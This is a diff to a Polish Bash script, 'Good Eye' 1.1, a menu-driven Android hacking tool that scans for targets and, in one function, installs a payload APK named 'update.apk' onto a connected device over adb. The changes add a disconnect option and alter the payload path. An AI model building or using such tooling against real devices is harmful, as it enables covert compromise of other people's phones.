@@ -56,7 +56,7 @@ generuj_ladunek()
 zaladuj_ladunek_do_celu()
 
 {
-	adb -s $UE install /home/kali/Desktop/update.apk
+	adb -s $UE install update.apk
 	clear
 	echo " Ladunek zaladowany "
 	sudo ./goodeye.sh
@@ -113,6 +113,12 @@ otworz_strone()
 	sudo ./goodeye.sh
 }
 
+rozlacz_devices()
+{
+	adb disconnect
+	sudo ./goodeye.sh
+}
+
 
 figlet GOOD EYE
 echo "Hakowanie androida nigdy nie bylo tak latwe."
@@ -121,7 +127,7 @@ echo "|---------------------------------|"
 echo "| Stworzono przez Przemyslaw Szmaj|"
 echo "| INSTA: _h4ker                   |"
 echo "| STRONA: www.ehaker.pl           |"
-echo "| Good Eye, wersja 1.0            |"
+echo "| Good Eye, wersja 1.1            |"
 echo "| Narzedzie stworzone w celu      |"
 echo "| EDUKACYJNYM                     |"
 echo "|---------------------------------|"
@@ -132,6 +138,7 @@ adb devices | awk '{print$1}'
 
 
 echo ""
+echo -e " [00]  \e[31m Rozlacz urzadzenia \e[0m"
 echo -e " [01]  \e[31m Przygotuj srodowisko \e[0m"	
 echo -e " [02]  \e[31m Pokaz dostepne cele w sieci \e[0m"
 echo -e " [03]  \e[31m Pokaz podlaczone cele \e[0m"
@@ -151,7 +158,7 @@ echo -e " [12]  \e[31m Otworz strone www na urzadzeniu \e[0m "
 read opcja
 case "$opcja" in
 
-
+  "00") rozlacz_devices ;; 
   "01") przygotuj_srodowisko ;;
   "02") pokaz_dostepne_cele ;;
   "03") podlaczone_cele ;;
